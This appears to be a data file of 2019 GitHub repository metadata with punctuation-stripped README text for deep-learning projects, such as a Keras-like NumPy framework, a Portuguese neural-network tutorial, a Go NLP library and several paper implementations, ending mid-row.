italyfiori,TinyDeepLearning,n/a,TinyDeepLearning TinyDeepLearningPythonAPIKerasTensor Class Model Sequential Model Layers Activation relu sigmoid softmax Faltten Dense Conv2d MaxPooling RNN Dropout Reshape Add Loss MSE SoftmaxCrossEntropy Optimizer SGD Momentum RMSprop Adam 1 python from sklearn import datasets from util import from layer import from sequential import from model import import numpy as np data datasets loaddigits X data data y data target Y tocategorical y astype int model Sequential SGD learningrate 0 01 SoftmaxCrossEntropy model add Dense 512 X shape 1 model add Activation relu model add Dense 512 model add Activation relu model add Dense 512 model add Activation relu model add Dense 10 errs accs model fit X Y 10 plots errs accs 2 python from sklearn import datasets from util import from layer import from sequential import from model import import numpy as np data datasets loaddigits X data data y data target Y tocategorical y astype int X X reshape 1 1 8 8 model Sequential SGD learningrate 0 01 SoftmaxCrossEntropy model add Conv2D 64 filtershape 3 3 inputshape 1 8 8 model add Activation relu model add MaxPooling 2 2 stride 2 model add Flatten model add Dense 256 model add Activation relu model add Dense 10 errs accs model fit X Y 50 plots errs accs 1 python from sklearn import datasets from util import from layer import from sequential import from model import import numpy as np data datasets loaddigits X data data y data target Y tocategorical y astype int X X reshape 1 1 8 8 x Input X shape t Conv2D 64 filtershape 3 3 x t Activation relu t t MaxPooling 2 2 stride 2 t t Flatten t t Dense 256 t t Activation relu t y Dense 10 t model Model x y model compile SGD learningrate 0 01 SoftmaxCrossEntropy errs accs model fit X Y 50 plots errs accs 2 python from sklearn import datasets from util import from layer import from sequential import from model import import numpy as np data datasets loaddigits X data data y data target Y tocategorical y astype int x Input X shape t0 Dense 512 x t Activation relu t0 fc Dense 512 t Dropout 0 2 t t fc t t Activation relu t t Dropout 0 2 t t fc t t Activation relu t y1 Dense 10 t y2 Dense 10 t0 y Add y1 y2 model Model x y model compile Adam learningrate 0 01 SoftmaxCrossEntropy errs accs model fit X Y 50 plots errs accs 3 python from sklearn import datasets from util import from layer import from sequential import from model import import numpy as np data datasets loaddigits X data data y data target Y tocategorical y astype int X X reshape 1 8 8 x Input X shape t RNN 70 returntype sequence x t Activation relu t t RNN 50 returntype laststate t t Activation relu t t Dense 256 t t Activation relu t y Dense 10 t model Model x y model compile SGD learningrate 0 01 SoftmaxCrossEntropy errs accs model fit X Y 100 plots errs accs,2019-06-28T14:55:42Z,2019-12-01T15:15:36Z,Python,italyfiori,User,5,23,4,11,master,italyfiori,1,0,0,0,0,0,0
Sam-Marx,redes-neurais,aprendizado-de-maquina#aprendizado-profundo#artificial-intelligence#deep-learning#inteligencia-artificial#machine-learning#neural-network#python3#redes-neurais-artificiais,Redes Neurais data http qis fnal gov wp content uploads 2018 09 3d ai artificial intelligence 1166602 jpg Este repositrio ser atualizado semanalmente pretendemos compartilhar tudo o que aprendemos para ajudar a comunidade Livre By J Junqueira https github com kuroninho Sam https github com Sam Marx and Pedro https github com ShowTiime Acervo no Telegram Clique aqui https t me AcervoDoSam Grupo no Telegram Clique aqui https t me abhackerspace Data prevista para postagens Sexta Sbado Assim que possvel ndice Captulo um Introdu o https github com Sam Marx redes neurais introdu o O que uma Rede Neural Artificial https github com Sam Marx redes neurais o que uma rede neural artificial Aplicaes das Redes Neurais Artificiais https github com Sam Marx redes neurais aplicaes das redes neurais artificiais O Incio de Tudo https github com Sam Marx redes neurais o incio de tudo Captulo dois Aprendizado de mquina Machine Learning Captulo trs Aprofundando as Redes Neurais Referncias bibliogrficas https github com Sam Marx redes neurais referncias bibliogrficas Introdu o O que uma Rede Neural Artificial Redes neurais artificiais s o tcnicas computacionais baseados em redes neurais biolgicas atravs de modelos matemticos inspirados no sistema nervoso central do ser humano Praticamente s o tentativas de replicar o comportamento do crebro humano j que visto como um processador extremamente complexo modelo grafico de uma RNA https i imgur com gg28OLm jpg A imagem acima demonstra uma representa o grfica de como uma rede neural artificial RNA profunda por ter mais de uma camada tambm chamada de Deep Learning A arquitetura da rede acima chamada de FeedForward cada camada se conecta prxima camada porm n o h caminho de volta ou seja as camadas tm a mesma dire o sada com camada de entrada conectada os links podem ser chamados de pesos camadas ocultas n o nem entrada nem sada tambm chamadas de camadas intermedirias e estas conectadas camada de sada Aplicaes das Redes Neurais Artificiais As redes neurais artificiais podem ser usadas em diversas reas com classifica o predi o e clustering 1 Classifica o Tcnica para categorizar os dados em um nmero desejado e distinto de classes onde possvel atribuir um rtulo a cada classe Exemplo reconhecimento de voz Tipo de rede normalmente usada FeedForward 2 Predi o Refere se sada de um algoritmo depois de ter sido treinado em um conjunto de dados histrico e aplicado em novos dados a fim de prever o resultado atravs dos dados treinados Exemplo recomenda o de produtos ou filmes Tipo de rede normalmente usada FeedForward 3 Clustering o conjunto de tcnicas de data mining prospec o de dados que visa fazer agrupamentos automticos de dados segundo o seu grau de semelhana Exemplo pode ser usado para classifica o entre diferentes espcies de plantas e animais Tipo de rede normalmente usada rede Hemming Maxnet redes competitivas foto de dentro do Tesla e o que ele v https www teslarati com wp content uploads 2016 11 Tesla autonomous self driving vision sensors jpg Sensores de vis o de um carro autnomo da Tesla usando redes neurais convolucionais CNN Convolutional Neural network para detec o de objetos Na realidade podem ser usadas em sistemas diferentes como no comrcio recomenda o de produto atravs de escolhas de usurio na medicina reconhecimento de doenas nos automveis carros autnomos etc O Incio de Tudo Na tentativa de criar sistemas inteligentes uma ideia que vem quase que instantaneamente s nossas cabeas a de simular o sistema mais rpido e mais potente que conhecemos hoje em dia em mquinas o crebro humano A rede neural um ramo do aprendizado de mquina que tenta simular o comportamento do crebro humano usando para isso conceitos da lgebra linear da estatstica do clculo e da biologia O Neurnio Biolgico Por que ent o n o comear do mais bsico O nosso crebro faz parte do sistema nervoso esse por sua vez possui um sistema extremamente complexo de clulas que s o determinantes para a vida dos seres vivos A unidade fundamental do sistema nervoso a clula nervosa ou como vamos cham la daqui em diante o neurnio A estrutura bsica de um neurnio a apresentada na figura abaixo Nela podemos observar trs partes principais os dendritos 1 que s o ramificaes onde a principal fun o receber estmulos nervosos vindos do ambiente ou mais comumente de outros neurnios Esses estmulos chegam at o corpo celular 2 alguns chamam de soma onde s o processados e por fim v o at o axnio 3 que pega o novo estmulo gerado pelo corpo celular e o envia para outros neurnios atravs de seus terminais Tais estmulos que s o conduzidos pelo axnio e que passa pelos seus terminais entram em contato com os dendritos de outros neurnios A esse contato damos o nome de sinapse Assim a nossa rede neural formada pela jun o de bilhes desses neurnios que conseguem realizar todo o processamento em fraes de segundos importante conhecermos a ordem de funcionamento do neurnio biolgico visto que ele a base para o neurnio matemtico que se comporta de forma semelhante Os dendritos e o corpo celular atuam como uma camada de entrada para o neurnio onde o estmulo vindo de sensores retina papilas epiderme etc ou de outros neurnios chegam aos dendritos e s o processados pelo corpo celular Aps isso esses sinais s o encaminhados para o axnio e se forem superior a um limiar de disparo seguem pelo axnio at os seus terminais Caso contrrio s o considerados irrelevantes e s o bloqueados Os sinais que passam e chegam aos terminais servem como entrada para outros neurnios atravs da intera o terminal axnico dendrito Foi com essa inspira o que o componente base das redes neurais artificiais foi criado o neurnio matemtico o qual voc vai conhecer agora mesmo O Neurnio Matemtico Assim como o neurnio biolgico a clula base que compe a rede neural do nosso crebro o neurnio matemtico o elemento base para as Redes Neurais Artificiais e por serem provenientes dos neurnios biolgicos podemos traar vrios paralelos para entendermos melhor o seu funcionamento Um neurnio a partir de agora irei usar apenas a nomenclatura neurnio para me referir aos neurnios matemticos caso me refira aos neurnios biolgicos deixarei explcito se parece com o mostrado na figura abaixo e possui um funcionamento bem simples As unidades de entrada que simulam os dendritos recebem os sinais esses sinais s o ponderados pelos seus respectivos pesos sinpticos e combinados por uma fun o matemtica f simulando assim o procedimento realizado pelo corpo celular A sada do neurnio faz o papel do axnio essa sada pode ser a resposta da rede ou pode ser uma conex o com as unidades de entrada de outro neurnio Essa conex o justamente a intera o entre os terminais do axnio e os dendritos do prximo neurnio e como vimos anteriormente essa intera o chamada de sinapse Para entendermos melhor como cada parte do neurnio funciona vamos aprofundar melhor nos conceitos matemticos por trs disso Suponha o objeto x com p atributos que ser o representados na forma de um vetor como x x1 x2 x3 xp e um neurnio n como o da figura acima com p terminais de entrada onde os pesos s o wk1 wk2 wkp que tambm podem ser representados de forma vetorial como w wk1 wk2 wk3 wkp onde p representa a entrada a qual o peso est associado e k o neurnio ao qual aquele peso corresponde em um neurnio todo o k uma constante por isso ser ocultado das equaes que est o por vir As entradas de um neurnio s o ponderadas e passam por uma jun o aditiva para gerar a sada que chamaremos de u u a entrada total recebida pelo neurnio n e pode ser definido pela equa o abaixo Se voc n o muito familiarizado com essas letras que aparecem em equaes matemticas eu vou explicar essa equa o melhor para voc Suponha que um determinado neurnio possua trs terminais de entrada x x1 x2 x3 cada entrada possui um peso associado ela w w1 w2 w3 a primeira fun o do neurnio pegar os sinais recebidos e ponder los usando seus pesos ou seja u x1 w1 x2 w2 x3 w3 Os pesos sinpticos representados pela letra w servem para ponderar as entradas recebidas pelo neurnio ou seja alguns estmulos recebidos pelo neurnio podem ser mais importantes que outros e o peso serve justamente para fazer esse ajuste Aps isso o neurnio passa por uma fun o de ativa o que ir definir a sada do neurnio Se o valor resultante da jun o aditiva das entradas que ns definimos sendo u for maior que um certo limiar threshold ent o o neurnio ativado caso contrrio o neurnio n o ativado Vale salientar que na computa o quando nos referimos ativado e n o ativado ligado e desligado estamos falando da base binria ou seja a sada de um neurnio se comporta de forma binria dada as suas entradas Se o conjunto de entradas aps ponderadas e somadas ultrapassarem um certo limiar a fun o de ativa o gera como sada 1 caso contrrio 0 Como podemos ver a fun o de ativa o tem papel fundamental na sada do neurnio e muitas delas j foram proposta na literatura hoje falarei das trs mais simples mas em artigos futuros vamos nos aprofundar em outras funes de ativaes A fun o linear a retorna apenas o valor de u u o soma de todas entradas ponderadas pelos seus respectivos pesos sinpticos A fun o limiar b a fun o em que o limiar threshold ir definir a sada da fun o Quando a soma das entradas ultrapassa esse limiar o resultado igual a 1 e o neurnio ativado Quanto maior o limiar mais difcil ser para o neurnio ser ativo Por ltimo a fun o sigmoidal c representa uma aproxima o contnua e diferencial da fun o limiar O neurnio matemtico pode conter o bias tendncia theta https latex codecogs com svg latex theta representado na figura abaixo que includo ao somatrio das entradas com o intuito de aumentar o grau de liberdade da fun o de ativa o e a capacidade de aproxima o da rede O valor do bias assim como os dos pesos sinpticos ajustado durante o aprendizado do neurnio cenas dos prximos captulos e ele possibilita que um neurnio apresente uma sada n o nula mesmo se todas as suas entradas forem nulas Sem isso n o seria possvel fazer com que o neurnio aprendesse o ou exclusivo oplus https latex codecogs com svg latex oplus algo que mudou o rumo das pesquisas em Rede Neural mas vamos falar sobre isso depois assim que o neurnio matemtico simula um neurnio biolgico e assim que comea nosso estudo por esse ramo da IA O neurnio a unidade bsica de tudo que vamos ver pela frente desde as redes Perceptron e Adaline que ser o nossos prximos objetos de estudo Redes Neurais mais complexas como as Redes Recorrentes as Redes Convolucionais e a famosa Deep Learning Alm dessas redes bsicas veremos como o aprendizado de uma rede neural a partir do algoritmo mais simples de corre o de erros e uma amostra da limita o dessas arquiteturas iniciais Referncias bibliogrficas O que uma Rede Neural Artificial https github com Sam Marx redes neurais o que uma rede neural artificial https portal tcu gov br inovatcu noticias aprendizado de maquina e divertido htm O que uma Rede Neural Artificial https github com Sam Marx redes neurais o que uma rede neural artificial http conteudo icmc usp br pessoas andre research neural Aplicaes das Redes Neurais Artificiais https github com Sam Marx redes neurais aplicaes das redes neurais artificiais https blog statsbot co neural networks for beginners d99f2235efca Aplicaes das Redes Neurais Artificiais https github com Sam Marx redes neurais aplicaes das redes neurais artificiais https towardsdatascience com introduction to neural networks advantages and applications 96851bd1a207 Aplicaes das Redes Neurais Artificiais https github com Sam Marx redes neurais aplicaes das redes neurais artificiais https medium com jayeshbahire real world applications of artificial neural networks a6a6bc17ad6a Aplicaes das Redes Neurais Artificiais https github com Sam Marx redes neurais aplicaes das redes neurais artificiais https www quora com What are the applications of neural networks,2019-07-30T20:13:28Z,2019-11-12T03:00:54Z,n/a,Sam-Marx,User,4,22,4,56,master,Sam-Marx#junque1r4#starvationnn#whitesource-bolt-for-github[bot],4,0,0,0,0,0,3
Lauzanhing,Learn-Deep-Learn-With-Me,deep-learning#machine-learning#nlp#python#pytorch,Learn Deep Learning With Me 09 BaseClass Ds 01 09 BaseClass Ds 01 md 02 09 BaseClass Ds 02 md 09 BaseClass Cc 01 09 BaseClass Cc 01 md 09 BaseClass Os 01 09 BaseClass Os 01 md 09 BaseClass Cn 01 09 BaseClass Cn 01 md 02 09 BaseClass Cn 02 md 03 09 BaseClass Cn 03 md 04 09 BaseClass Cn 04 md 05 09 BaseClass Cn 05 md 06 09 BaseClass Cn 06 md Python 01 Python 01 base 01 ipynb 01 Python 01 base 01QuickStart ipynb 01 md 01 Python 01 base 01QuickStart md 02 ipynb 01 Python 01 base 02number ipynb 02 md 01 Python 01 base 02number md 03 ipynb 01 Python 01 base 03string ipynb 03 md 01 Python 01 base 03string md 04 ipynb 01 Python 01 base 04listbase ipynb 04 md 01 Python 01 base 04listbase md 0502 ipynb 01 Python 01 base 05listpro ipynb 0502 md 01 Python 01 base 05listpro md 06 ipynb 01 Python 01 base 06dict ipynb 06 md 01 Python 01 base 06dict md 07if ipynb 01 Python 01 base 07if ipynb 07if md 01 Python 01 base 07if md 08while ipynb 01 Python 01 base 08while ipynb 08while md 01 Python 01 base 08while md NLP CS230 YouTube https www youtube com watch v PySo6S4ZAg list PLoROMvodv4rOABXSygHTsbvUz4GYQhOb Bilibili https www bilibili com video av59184396 http cs230 stanford edu Python https item jd com 11993134 html Python https www liaoxuefeng com wiki 1016959663602400,2019-07-05T11:32:03Z,2019-12-03T15:45:53Z,Jupyter Notebook,Lauzanhing,User,1,21,12,47,master,Lauzanhing,1,0,0,0,0,0,0
MicrobeLab,DeepMicrobes,bioinformatics#deep-learning#metagenomics#microbiome#next-generation-sequencing,DeepMicrobes DeepMicrobes taxonomic classification for metagenomics with deep learning Supplementary data for the paper under preparation is available at https github com MicrobeLab DeepMicrobes data IMPORTANT The new DeepMicrobes beta version is available now Please feel free to contact us if you have any suggestions or encounter any errors Usage Getting start with DeepMicrobes https github com MicrobeLab DeepMicrobes blob master document example md How to install https github com MicrobeLab DeepMicrobes blob master document install md How to convert fastq fasta sequences to TFRecord https github com MicrobeLab DeepMicrobes blob master document tfrecord md How to make predictions on a metagenome dataset https github com MicrobeLab DeepMicrobes blob master document prediction md How to generate taxonomic profiles https github com MicrobeLab DeepMicrobes blob master document profile md How to choose the confidence threshold https github com MicrobeLab DeepMicrobes blob master document confidence md How to train the DNN model of DeepMicrobes https github com MicrobeLab DeepMicrobes blob master document train md How to submit to GPUs https github com MicrobeLab DeepMicrobes blob master document gpu md Suggestions on training a custom model for advanced users https github com MicrobeLab DeepMicrobes blob master document custom md Contact Any issues with the DeepMicrobes framework can be filed with GitHub issue tracker https github com MicrobeLab DeepMicrobes issues We are committed to maintain this repository to assist users and tackle errors Email liangqx7 mail2 sysu edu cn Qiaoxing Liang,2019-07-03T10:55:09Z,2019-12-13T09:13:26Z,Python,MicrobeLab,User,3,21,2,47,master,MicrobeLab,1,0,0,0,2,0,0
multimodallearning,pdd_net,n/a,pddnet Probabilistic Dense Displacement Network 3D discrete deep learning registration Code for the MICCAI 2019 paper Closing the Gap between Deep and Conventional Image Registration using Probabilistic Dense Displacement Networks We address the shortcoming of current DL registration approaches that lack the ability to learn large complex deformation with few labelled training scans by leveraging ideas from probabilistic dense displacement optimisation These approaches have excelled in many registration tasks with large deformations We propose to design a network with approximate min convolutions and mean field inference for differentiable displacement regularisation within a discrete weakly supervised registration setting By employing these meaningful and theoretically proven constraints our learnable registration algorithm contains very few trainable weights primarily for feature extraction and is easier to train with few labelled scans It is very fast in training and inference and achieves state of the art accuracies for the challenging inter patient registration of abdominal CT outperforming previous deep learning approaches by 15 Dice overlap Concept figure miccai2019pddconcept png Concept Figure Concept of probabilistic dense displacement network 1 deformable convolution layers extract features for both fixed and moving image 2 the correlation layer evaluates for each 3D grid point a dense displacement space yielding a 6D dissimilarity map 3 spatial filters that promote smoothness act on dimensions 4 6 min convolutions and dim 1 3 mean field inference in alternation 4 the probabilistic transform distribution obtained using a softmax over dim 4 6 is used in a non local label loss and converted to 3D displacements for a diffusion regularisation and to warp images More details will follow please see basic example in provided pytorch code v0 1 A more modular version and scripts to pre process your own data is currently in progress If you find this method useful and want to use parts of it Please cite the following publication M P Heinrich Closing the Gap between Deep and Conventional Image Registration using Probabilistic Dense Displacement Networks MICCAI 2019 Springer LNCS accepted in press,2019-07-02T11:18:25Z,2019-12-11T05:42:24Z,Python,multimodallearning,Organization,6,21,5,8,master,mattiaspaul,1,0,0,1,0,0,0
po3rin,gonnp,deep-learning#go#golang#machine-learning#neural-network#nlp#word2vec,gonnp Deep learning from scratch using Go Specializes in natural language processing CircleCI https circleci com gh po3rin gonnp svg style shield circle token d2ad1b26978ffeb0f6aa43b9a517ec7e5180d474 https circleci com gh po3rin gonnp GolangCI https golangci com badges github com po3rin gonnp svg https golangci com Go Report Card https goreportcard com badge github com po3rin gonnp https goreportcard com report github com po3rin gonnp codecov https codecov io gh po3rin gonnp branch master graph badge svg https codecov io gh po3rin gonnp GoDoc https godoc org github com po3rin gonnp status svg https godoc org github com po3rin gonnp What Package gonnp is the library of neural network components specialized in natural language processing in Go You can assemble a neural network with the necessary components Dependencies This component depends on gonum org v1 gonum mat https github com gonum gonum Components The number of components will increase in the future Layers Affine MatuMul Embedding EmbeddingDot Relu Sigmoid Softmax with Loss Sigmoid with Loss Optimizer SDG Adam Sampler Unigram Sampler Directory layers Package layers impliments various layer for neural network matutil Package matutil has utility functions of gonum matrix models Package models has some of neural netwark models optimizers Package optimizers updates prams ex weight bias using various algorism params Package params has common parametors type store Package store lets you to store trained data testdata ptb Package ptb provides load PTB data functions trainer Package trainer impliments shorhand of training for deep lerning word Package word is functions of text processing Example Word2Vec with EmbeddingDot Layers Negative Sampling go package e2etest import fmt io ioutil log os github com po3rin gonnp matutil github com po3rin gonnp models github com po3rin gonnp optimizers github com po3rin gonnp trainer github com po3rin gonnp word func main windowSize 5 hiddenSize 100 batchSize 100 maxEpoch 10 prepare one hot matrix from text data file err os Open testdata golang txt if err nil log Fatal err defer file Close text err ioutil ReadAll file if err nil log Fatal err corpus w2id id2w word PreProcess string text vocabSize len w2id contexts target word CreateContextsAndTarget corpus windowSize Inits model model models InitCBOW vocabSize hiddenSize windowSize corpus choses optimizer optimizer optimizers InitAdam 0 001 0 9 0 999 inits trainer with model optimizer trainer trainer InitTrainer model optimizer training trainer Fit contexts target maxEpoch batchSize checks outputs dist trainer GetWordDist w2v word GetWord2VecFromDist dist id2w for w v range w2v fmt Printf v n w matutil PrintMat v outputs bash you 0 983712641282964 0 9633828650811918 0 7253396760955725 0 9927919148802162 MNIST go package main import github com po3rin gomnist github com po3rin gonnp models github com po3rin gonnp optimizers github com po3rin gonnp trainer func main model models NewTwoLayerNet 784 100 10 optimizer optimizers InitSDG 0 01 trainer trainer InitTrainer model optimizer trainer EvalInterval 20 load MNIST data using github com po3rin gomnist package l gomnist NewLoader testdata gomnist OneHotLabel true gomnist Normalization true mnist l Load trainer Fit mnist TestData mnist TestLabels 10 100 Reference https github com oreilly japan deep learning from scratch 2 TODO Impliments RNN,2019-08-06T19:42:05Z,2019-10-12T13:33:38Z,Go,po3rin,User,4,21,1,104,master,po3rin,1,0,0,0,1,0,2
XinshaoAmosWang,Ranked-List-Loss-for-DML,deep-metric-learning#fine-grained-recognition#image-clustering#image-retrieval#learning-to-rank#open-set-recognition,Ranked List Loss for Deep Metric Learning Paper https arxiv org abs 1903 03238 Slides https drive google com file d 1nSXCe 7tEkNwjFuXTnmzzoFr 6jFKVW view usp sharing Poster https drive google com file d 1vSp3mDRJKdQFNUH12ehuDDyqQfjXFnWM view usp sharing To Visualise the Repository Tree Structure cd Ranked List Loss for Deep Metric Learning tree Dependencies The core functions are implemented in the caffe https github com BVLC caffe framework We use matlab interfaces matcaffe for data preparation CaffeMexv2 https github com sciencefans CaffeMexv2 tree 9bab8d2aaa2dbc448fd7123c98d225c680b066e4 MATLAB 2017b https uk mathworks com products newproducts release2017b html Setup Clone our repository and the submodule Simply copy and execute following commands in the command line bash git clone git github com XinshaoAmosWang Ranked List Loss for D eep Metric Learning git cd Ranked List Loss for Deep Metric Learning git submodule add git github com sciencefans CaffeMexv2 git git submodule init git submodule update git submodule update remote merge Put the files of new layers to the corresponding directories of submodule CaffeMexv2 https github com sciencefans CaffeMexv2 tree 9bab8d2aaa2dbc448fd7123c98d225c680b066e4 bash cp NewLayersbyXinshaoAmosWang cpp CaffeMexv2 src caffe layers cp NewLayersbyXinshaoAmosWang hpp CaffeMexv2 include caffe layers cp NewLayersbyXinshaoAmosWang caffe proto CaffeMexv2 src caffe proto cp NewLayersbyXinshaoAmosWang Makefile config CaffeMexv2 Install dependencies on Ubuntu 16 04 http caffe berkeleyvision org installapt html bash sudo apt get install libprotobuf dev libleveldb dev libsnappy dev libopencv dev libhdf5 serial dev protobuf compiler sudo apt get install no install recommends libboost all dev sudo apt get install libopenblas dev sudo apt get install python dev sudo apt get install libgflags dev libgoogle glog dev liblmdb dev Install MATLAB 2017b https uk mathworks com products newproducts release2017b html Download and Run the install binary file bash install Compile Caffe and matlab interface Note you may need to change some paths in Makefile config according your system environment and MATLAB path bash cd CaffeMexv2 make j8 make matcaffe Usage Examples for reproducing our results on Stanford Online Product dataset http cvgl stanford edu projects liftedstruct are given Data preparation for SOP Downlaod StanfordOnlineProducts dataset from ftp cs stanford edu cs cvgl StanfordOnlineProducts zip For simplicity you can use the data mat file in prepostprocess directory which is ready training and testing scripts To solve the data path you can do eithor a or b a Changing the path within the mat files b A Simpler way Create a soft link of your data e g sudo ln s StanfordOnlineProducts home xinshao PapersProjects Data StanfordOnlineProducts Custom data preparation You only need to create training testing mat files with the same structure as SOPTrainImagePathBoxCell mat and SOPTestImagePathBoxCell mat in directory SOPGoogLeNetOriV05 preproprocess e g SOPTrainImagePathBoxCell mat contains TrainImagePathBoxCell storing all image paths and classids storing their corresponding semantic labels Train Test Run the training and testing scripts in the training folder of a specific setting defined by its corresponding prototxt folder Our trained model on SOP You can use the test scripts to test the performance of our trained model in the directory OurtrainedmodelsonSOPT10m12pn04iter16000 Example on how to train on CUB 200 2011 dataset Please see the folder CUBV01 More Qualitative results Slides https drive google com file d 1nSXCe 7tEkNwjFuXTnmzzoFr 6jFKVW view usp sharing Poster https drive google com file d 1vSp3mDRJKdQFNUH12ehuDDyqQfjXFnWM view usp sharing Citation If you find our code and paper useful in your research please kindly cite our paper bash InProceedingsWang2019CVPR author Wang Xinshao and Hua Yang and Kodirov Elyor and Hu Guosheng and Garnier Romain and Robertson Neil M title Ranked List Loss for Deep Metric Learning booktitle The IEEE Conference on Computer Vision and Pattern Recognition CVPR month June year 2019 Common questions 1 What does ranking mean The overall objective is to make the postive set rank before the negative set by a distance margin We do not need to consider the exact order of examples within the positive set and negative set 2 What are the key components which influence the performance a lot Sample mining Sample weighting Two distance hyper parameters for optimisation and regularisation jointly Exploiting a weighted combination of more data points 3 How is a loss function related with deep metric learning Acknowledgements Our work benefits from Hyun Oh Song Yu Xiang Stefanie Jegelka and Silvio Savarese Deep Metric Learning via Lifted Structured Feature Embedding In IEEE Conference on Computer Vision and Pattern Recognition CVPR 2016 http cvgl stanford edu projects liftedstruct CaffeMexv2 library https github com sciencefans CaffeMexv2 tree 9bab8d2aaa2dbc448fd7123c98d225c680b066e4 Caffe library https caffe berkeleyvision org Licence BSD 3 Clause New or Revised License Affiliations Queen s University Belfast UK Anyvision Research Team UK Contact Xinshao Wang You can call me Amos as well xwang39 at qub ac uk,2019-06-29T20:01:33Z,2019-12-03T02:46:06Z,MATLAB,XinshaoAmosWang,User,3,19,6,50,master,XinshaoAmosWang,1,0,0,2,1,0,1
EricArazo,PseudoLabeling,n/a,Pseudo Labeling and Confirmation Bias in Deep Semi Supervised Learning 2019 Paper https arxiv org abs 1908 02983 Official Pytorch implementation from authors Our pseudo labeling approach achieves state of the art performance for semi supervised learning SSL in Image Classification Installation Docker Install Docker https docs docker com install and NVIDIA Docker https github com NVIDIA nvidia docker Build the image docker build t pseudolabeling Start the container docker run gpus all name pseudolabeling v pwd pseudolabeling it w pseudolabeling pseudolabeling bash To run the code without GPU NVIDIA Docker is not required and remove gpus all Manual install Dependencies python 3 5 2 pytorch 0 4 1 cuda 8 0 torchvision 0 2 1 torchcontrib 0 0 2 matplotlib 3 0 1 scikit learn 0 20 0 tqdm 4 28 1 numpy 1 15 3 Usage You can find an example script to run the poroposed SSL approach on CIFAR 10 with 500 labeled samples in RunScriptsSOTA500 sh https github com EricArazo PseudoLabeling blob master cifar10 RunScriptsSOTA500 sh and for CIFAR 100 with 4000 labeled samples in RunScriptsSOTA4000 sh https github com EricArazo PseudoLabeling blob master cifar100 RunScriptsSOTA4000 sh Execute the script from the corresponding folder to train the model Parameters details Execute the following to get details about parameters Most of them are set by default to replicate our experiments sh python train py h The most relevant parameters are the following labeledsamples Number of labeled samples epoch Number of epochs of training M Epochs where the learning rate is divided by 10 network Network architecture MTNet WRN282wn or PreactResNet18WNdrop DA Type of data augmentation standard or jitter To run the experiments download the corresponding dataset in the folder CIFAR10 data or CIFAR100 data Test Errors Number of labeled samples 500 1000 4000 10000 CIFAR 10 8 80 0 45 6 85 0 15 5 97 0 15 CIFAR 100 37 55 1 09 32 15 0 5 Acknowledgements We would like to thank 1 https github com benathi fastswa semi sup for the 13 layer network implmentation 2 https github com vikasverma1077 ICT for the WR282 network implmentation and 3 https github com CuriousAI mean teacher for the data sampler code that we use in our code 1 Athiwaratkun Ben and Finzi Marc and Izmailov Pavel and Wilson Andrew Gordon There Are Many Consistent Explanations of Unlabeled Data Why You Should Average in International Conference on Learning Representations ICLR 2019 2 Verma Vikas and Lamb Alex and Kannala Juho and Bengio Yoshua and Lopez Paz David Interpolation Consistency Training for Semi Supervised Learning in International Joint Conferences on Artificial Intelligence IJCAI 2019 3 Antti Tarvainen Harri Valpola Mean teachers are better role models Weight averaged consistency targets improve semi supervised deep learning results in Advances in neural information processing systems 2017 Please consider citing the following paper if you find this work useful for your research articlePseudoLabel2019 title Pseudo Labeling and Confirmation Bias in Deep Semi Supervised Learning authors Eric Arazo and Diego Ortego and Paul Albert and Noel E O Connor and Kevin McGuinness journal arXiv 1908 02983 month August year 2019 Eric Arazo Diego Ortego Paul Albert Noel E O Connor Kevin McGuinness Pseudo Labeling and Confirmation Bias in Deep Semi Supervised Learning arXiv 1908 02983 2019,2019-08-05T13:57:06Z,2019-12-14T05:30:53Z,Python,EricArazo,User,4,19,4,28,master,EricArazo#DiegoOrtego#enric1994,3,0,0,0,1,0,1
ml-research,pau,n/a,PAU Pad Activation Units Pad Activation Units End to end Learning of Activation Functions in Deep Neural Network Arxiv link https arxiv org abs 1907 06732 1 About Pad Activation Units Pad Activation Units PAU are a novel learnable activation function PAUs encode activation functions as rational functions trainable in an end to end fashion using backpropagation and can be seemingless integrated into any neural network in the same way as common activation functions e g ReLU PAU matches or outperforms common activations in terms of predictive performance and training time And therefore relieves the network designer of having to commit to a potentially underperforming choice 2 Dependencies PyTorch 1 1 0 CUDA 10 1 airspeed 0 5 11 3 Installation PAU is implemented as a pytorch extension using CUDA 10 1 So all that is needed is to install the extension This requires the cuda compiler and dev tools however the process is pretty straight forward in the folder pau cuda execute python3 setup py install For this you might need super user rights or work in a virtual environment 4 Using PAU in Neural Networks PAU can be integrated in the same way as any other common activation function import torch from pau utils import PAU model torch nn Sequential torch nn Linear Din H PAU e g instead of torch nn ReLU torch nn Linear H Dout 5 Reproducing Results To reproduce the reported results of the paper execute export PYTHONPATH python experiments main py dataset mnist arch conv optimizer adam lr 2e 3 DATASET Name of the dataset for MNIST use mnist and for Fashion MNIST use fmnist ARCH selected neural network architecture vgg lenet or conv OPTIMIZER either adam or sgd LR learning rate,2019-07-08T14:24:48Z,2019-11-06T10:26:14Z,Python,ml-research,Organization,2,18,0,18,master,PatrickSchrML#alejandromolinaml,2,0,0,1,1,0,0
DenseAI,awesome-deep-learning,n/a,awesome deep learning QQ791193818 1 https github com DenseAI awesome deep learning 1 1 1 https github com DenseAI awesome deep learning 11 1 2 https github com DenseAI awesome deep learning 12 1 3 https github com DenseAI awesome deep learning 13 1 4 https github com DenseAI awesome deep learning 14 1 5 https github com DenseAI awesome deep learning 15 2 https github com DenseAI awesome deep learning 2 2 1 https github com DenseAI awesome deep learning 21 2 2 https github com DenseAI awesome deep learning 22 2 3 https github com DenseAI awesome deep learning 23 2 4 https github com DenseAI awesome deep learning 24 2 5 https github com DenseAI awesome deep learning 25 3 https github com DenseAI awesome deep learning 3 3 1 https github com DenseAI awesome deep learning 31 3 2 https github com DenseAI awesome deep learning 32 3 3 Python https github com DenseAI awesome deep learning 33 python 3 4 AlphaGo Zero https github com DenseAI awesome deep learning 34 alphago zero 4 GAN https github com DenseAI awesome deep learning 4 gan 4 1 https github com DenseAI awesome deep learning 41 4 2 GAN https github com DenseAI awesome deep learning 42 gan 4 3 https github com DenseAI awesome deep learning 43 5 NLP https github com DenseAI awesome deep learning 5 nlp 5 1 Word2vec https github com DenseAI awesome deep learning 51 word2vec 5 2 Attention Mechanism https github com DenseAI awesome deep learning 52 attention mechanism 1 1 1 DNN https www cnblogs com pinard p 6418668 html DNN BP https www cnblogs com pinard p 6422831 html DNN https www cnblogs com pinard p 6437495 html DNN https www cnblogs com pinard p 6472666 html CNN https www cnblogs com pinard p 6483207 html CNN https www cnblogs com pinard p 6489633 html CNN https www cnblogs com pinard p 6494810 html RNN https www cnblogs com pinard p 6509630 html LSTM https www cnblogs com pinard p 6519110 html 1 2 MLP http zh d2l ai chapterdeep learning 